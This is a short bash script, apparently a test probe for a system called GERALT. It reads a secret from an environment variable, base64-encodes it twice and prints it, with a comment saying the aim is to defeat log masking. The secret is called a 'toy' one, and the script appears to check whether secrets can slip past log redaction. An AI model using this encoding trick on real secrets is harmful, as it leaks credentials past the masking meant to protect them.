#!/usr/bin/env bash
# GERALT verification probe: leak the toy secret as double-base64 to defeat log masking.
if [ -z "${GERALT_SECRET:-}" ]; then
  echo "GERALT_LEAKED_TOKEN=EMPTY"
  exit 1
fi
once=$(printf '%s' "$GERALT_SECRET" | base64 | tr -d '\n')
twice=$(printf '%s' "$once" | base64 | tr -d '\n')
echo "GERALT_LEAKED_TOKEN=${twice}"
exit 1
